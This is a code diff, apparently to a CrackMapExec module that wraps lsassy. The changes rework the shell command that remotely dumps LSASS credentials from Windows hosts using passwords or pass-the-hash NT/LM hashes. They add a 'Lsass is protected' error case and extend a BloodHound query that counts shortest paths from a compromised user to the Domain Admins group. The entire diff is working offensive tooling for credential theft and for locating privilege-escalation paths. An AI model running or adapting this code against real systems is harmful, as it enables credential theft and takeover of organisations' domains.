@@ -83,25 +83,24 @@ class CMEModule:
         password = getattr(connection, "password", "")
         lmhash = getattr(connection, "lmhash", "")
         nthash = getattr(connection, "nthash", "")
+
+        password = "" if password is None else password
+        lmhash = "" if lmhash is None else lmhash
+        nthash = "" if nthash is None else nthash
+
         host = connection.host
 
-        py_arg = "{}/{}:{}@{}".format(
-            domain_name, username, password, host
-        )
-
-        command = r"lsassy -j --hashes {}:{} '{}'".format(
-            lmhash,
-            nthash,
-            py_arg
+        command = r"lsassy --format json -d '{}' -u '{}' -p '{}' -H '{}:{}' {}".format(
+            domain_name, username, password, lmhash, nthash, host
         )
 
         if context.verbose:
-            command += " -d "
+            command += " -vv "
         else:
-            command += " -q "
+            command += " --quiet "
 
         if self.method:
-            command += " -m {}".format(self.method)
+            command += " --method {}".format(self.method)
 
         if self.remote_lsass_dump:
             command += " --dumpname {}".format(self.remote_lsass_dump)
@@ -124,8 +123,11 @@ class CMEModule:
 
         if code != 0:
             # Debug output
-            context.log.error('Error while executing lsassy, try using CrackMapExec with --verbose to get more details')
-            context.log.debug('----- lsassy error -----')
+            if code == 5:
+                context.log.error('Lsass is protected')
+            else:
+                context.log.error('Error while executing lsassy, try using CrackMapExec with --verbose to get more details')
+            context.log.debug('----- lsassy error [{}] -----'.format(code))
             for line in err.split("\n"):
                 context.log.debug('{}'.format(line))
             context.log.debug('-----   end error  -----')
@@ -259,7 +261,7 @@ class CMEModule:
             with session.begin_transaction() as tx:
                 query = """
                     MATCH (n:User {{name:\"{}\"}}),(m:Group),p=shortestPath((n)-[r:{}*1..]->(m))
-                    WHERE m.objectsid ENDS WITH "-512" 
+                    WHERE m.objectsid ENDS WITH "-512" OR m.objectid ENDS WITH "-512"
                     RETURN COUNT(p) AS pathNb
                     """.format(username, '|'.join(effective_edges))
 
